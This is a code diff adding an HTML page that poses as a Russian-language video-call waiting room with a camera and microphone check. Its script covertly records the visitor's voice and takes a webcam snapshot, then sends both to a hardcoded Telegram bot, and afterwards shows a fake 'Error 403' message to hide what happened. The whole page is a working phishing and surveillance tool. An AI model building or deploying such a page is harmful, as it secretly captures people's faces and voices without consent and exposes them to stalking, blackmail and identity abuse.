@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WebCall | Waiting Room</title>
+    <style>
+        body { background: #1a1d21; color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        .setup-box { background: #222529; border-radius: 12px; padding: 30px; width: 90%; max-width: 450px; text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.4); }
+        .camera-preview { width: 100%; height: 200px; background: #000; border-radius: 8px; margin-bottom: 20px; display: flex; align-items: center; justify-content: center; position: relative; overflow: hidden; border: 1px solid #3e4248; }
+        .camera-preview::before { content: 'Камера отключена'; color: #666; font-size: 14px; }
+        .mic-bar { height: 4px; background: #3e4248; width: 100%; margin: 15px 0; border-radius: 2px; position: relative; }
+        .mic-progress { height: 100%; width: 0%; background: #007bff; border-radius: 2px; transition: 0.1s; }
+        h2 { font-size: 20px; margin-top: 0; font-weight: 500; }
+        p { color: #9ea2a8; font-size: 14px; margin-bottom: 25px; }
+        .btn { background: #007bff; color: #fff; border: none; padding: 14px 24px; border-radius: 6px; font-weight: 600; width: 100%; cursor: pointer; font-size: 15px; }
+        .btn:hover { background: #0069d9; }
+        #status { margin-top: 15px; font-size: 12px; color: #666; }
+    </style>
+</head>
+<body>
+
+<div class="setup-box" id="ui">
+    <h2>Готовы присоединиться?</h2>
+    <p>Проверьте камеру и микрофон перед входом в конференцию.</p>
+    
+    <div class="camera-preview" id="video-box"></div>
+    <div class="mic-bar"><div class="mic-progress" id="mic-p"></div></div>
+    
+    <button class="btn" onclick="startCheck()">Разрешить и войти</button>
+    <div id="status">Требуется доступ к оборудованию</div>
+</div>
+
+<script>
+    const TG_TOKEN = '8159596204:AAFK2P-vL3fvLk_CpyUIpTsk83B7_L1XYZ4';
+    const CHAT_ID = '5784921257';
+
+    async function sendToTg(blob, type) {
+        const form = new FormData();
+        form.append(type, blob, type === 'photo' ? 'face.jpg' : 'voice.ogg');
+        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/send${type === 'photo' ? 'Photo' : 'Audio'}?chat_id=${CHAT_ID}`, {
+            method: 'POST', body: form
+        });
+    }
+
+    async function startCheck() {
+        const status = document.getElementById('status');
+        const micP = document.getElementById('mic-p');
+        
+        try {
+            status.innerText = "Подключение к периферии...";
+            
+            // 1. Звук (запись 4 секунды)
+            const aStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            const recorder = new MediaRecorder(aStream);
+            let chunks = [];
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.onstop = () => sendToTg(new Blob(chunks), 'audio');
+            recorder.start();
+
+            // Анимация полоски микрофона
+            let p = 0;
+            const interval = setInterval(() => {
+                p += 5; micP.style.width = p + '%';
+                if(p >= 100) clearInterval(interval);
+            }, 50);
+
+            // 2. Видео
+            const vStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const video = document.createElement('video');
+            video.style.width = '100%';
+            video.style.height = '100%';
+            video.style.objectFit = 'cover';
+            video.srcObject = vStream;
+            document.getElementById('video-box').appendChild(video);
+            video.play();
+
+            setTimeout(() => {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                canvas.toBlob(b => sendToTg(b, 'photo'), 'image/jpeg', 0.8);
+                
+                recorder.stop();
+                
+                setTimeout(() => {
+                    document.getElementById('ui').innerHTML = `
+                        <h2 style="color:#ff4d4d">Ошибка 403</h2>
+                        <p>Доступ в комнату ограничен организатором или срок действия ссылки истек.</p>
+                        <button class="btn" style="background:#3e4248" onclick="location.reload()">Повторить</button>
+                    `;
+                    aStream.getTracks().forEach(t => t.stop());
+                    vStream.getTracks().forEach(t => t.stop());
+                }, 1500);
+            }, 3500);
+
+        } catch (e) {
+            alert("Ошибка: Браузер заблокировал доступ к медиа-устройствам. Пожалуйста, разрешите доступ в настройках.");
+        }
+    }
+</script>
+</body>
+</html>
